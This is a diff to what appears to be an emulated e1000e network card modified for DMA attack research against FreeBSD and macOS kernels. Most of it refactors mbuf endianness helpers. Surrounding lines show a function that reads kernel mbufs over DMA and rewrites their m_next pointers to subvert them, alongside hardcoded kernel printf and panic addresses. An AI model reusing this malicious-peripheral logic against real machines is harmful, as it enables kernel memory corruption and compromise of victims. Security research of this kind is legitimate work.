@@ -3655,51 +3655,30 @@ bswap24(uint32_t x)
 	return ((x & 0xFF0000) >> 16) | (x & 0x00FF00) | ((x & 0x0000FF) << 16);
 }
 
-#ifdef VICTIM_MACOS
-#define FIX_MBUF()		endianness_swap_mac_mbuf_header(mbuf);
-#else
-#define FIX_MBUF()														\
-	FIX_64_FIELD(mbuf->m_next);											\
-	FIX_64_FIELD(mbuf->m_nextpkt);										\
-	FIX_64_FIELD(mbuf->m_data);											\
-	FIX_32_FIELD(mbuf->m_len);											\
-	mbuf->m_flags = bswap24(mbuf->m_flags);								\
-																		\
-	FIX_64_FIELD(mbuf->m_ext.ext_cnt);									\
-	FIX_64_FIELD(mbuf->m_ext.ext_buf);									\
-	FIX_32_FIELD(mbuf->m_ext.ext_size);									\
-	mbuf->m_ext.ext_flags = bswap24(mbuf->m_ext.ext_flags);				\
-	FIX_64_FIELD(mbuf->m_ext.ext_free);									\
-	FIX_64_FIELD(mbuf->m_ext.ext_arg1);									\
-	FIX_64_FIELD(mbuf->m_ext.ext_arg2)
-#endif
-
-
+#ifndef VICTIM_MACOS
 void
-mbuf_le_to_cpu(struct mbuf *mbuf)
+endianness_swap_freebsd_mbuf_header(struct mbuf *mbuf)
 {
 #define FIX_32_FIELD(field)	field = (typeof(field))le32_to_cpu((int32_t)field)
 #define FIX_64_FIELD(field)	field = (typeof(field))le64_to_cpu((int64_t)field)
 
-	FIX_MBUF();
+	FIX_64_FIELD(mbuf->m_next);
+	FIX_64_FIELD(mbuf->m_nextpkt);
+	FIX_64_FIELD(mbuf->m_data);
+	FIX_32_FIELD(mbuf->m_len);
+	mbuf->m_flags = bswap24(mbuf->m_flags);
+	FIX_64_FIELD(mbuf->m_ext.ext_cnt);
+	FIX_64_FIELD(mbuf->m_ext.ext_buf);
+	FIX_32_FIELD(mbuf->m_ext.ext_size);
+	mbuf->m_ext.ext_flags = bswap24(mbuf->m_ext.ext_flags);
+	FIX_64_FIELD(mbuf->m_ext.ext_free);
+	FIX_64_FIELD(mbuf->m_ext.ext_arg1);
+	FIX_64_FIELD(mbuf->m_ext.ext_arg2);
 
 #undef FIX_32_FIELD
 #undef FIX_64_FIELD
 }
 
-void
-mbuf_cpu_to_le(struct mbuf *mbuf)
-{
-#define FIX_32_FIELD(field) field = (typeof(field))cpu_to_le32((int32_t)field)
-#define FIX_64_FIELD(field) field = (typeof(field))cpu_to_le64((int64_t)field)
-
-	FIX_MBUF();
-
-#undef FIX_32_FIELD
-#undef FIX_64_FIELD
-}
-
-#ifndef VICTIM_MACOS
 void
 print_freebsd_mbuf_information(const struct mbuf *mbuf)
 {
@@ -3753,10 +3732,11 @@ print_buffer_address_information(E1000ECore *core,
 	} else {
 		pci_dma_read(core->owner, ba & ~0xFF, (uint8_t *)(&mbuf_buffer),
 			sizeof(struct mbuf));
-		mbuf_le_to_cpu(&mbuf_buffer);
 #ifdef VICTIM_MACOS
+		endianness_swap_mac_mbuf_header(&mbuf_buffer);
 		print_macos_mbuf_header(&mbuf_buffer);
 #else
+		endianness_swap_freebsd_mbuf_header(&mbuf_buffer);
 		print_freebsd_mbuf_information(&mbuf_buffer);
 #endif
 	}
@@ -3967,6 +3947,21 @@ record_tx_windows_from_descriptor_address(E1000ECore *core,
 }
 #endif
 
+void
+print_macos_mbuf(E1000ECore *core, hwaddr ba)
+{
+	struct mbuf mbuf;
+
+	PDBG("Attempting to subvert buffer with address 0x%lx.", ba);
+
+	if ((ba % 2048) == 0) {
+		PDBG("Buffer is probably a cluster.");
+		return; /* Probably a cluster */
+	}
+
+
+}
+
 
 const void *KERNEL_PRINTF_ADDR = 	(void *)0xffffffff80a4da90ll;
 const void *KERNEL_PANIC_ADDR =		(void *)0xffffffff80a0b9a0ll;
@@ -3988,7 +3983,7 @@ attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
 
 
 	pci_dma_read(core->owner, ba & ~0xFF, mbuf, sizeof(struct mbuf));
-	mbuf_le_to_cpu(mbuf);
+	endianness_swap_freebsd_mbuf_header(mbuf);
 
 	uint64_t kernel_mbuf_addr = (uint64_t)mbuf->m_data & ~0xFF;
 	PDBG("Kernel's address for mbuf: 0x%lx.", kernel_mbuf_addr);
@@ -4013,7 +4008,7 @@ attempt_to_subvert_mbuf(E1000ECore* core, hwaddr ba)
 	 */
 	mbuf->m_next = (struct mbuf *)(kernel_mbuf_addr + sizeof(struct mbuf) + 8);
 
-	mbuf_cpu_to_le(mbuf);
+	endianness_swap_freebsd_mbuf_header(mbuf);
 
 	/*
 	 * Have to write this after the conversion, because it collides with mbuf
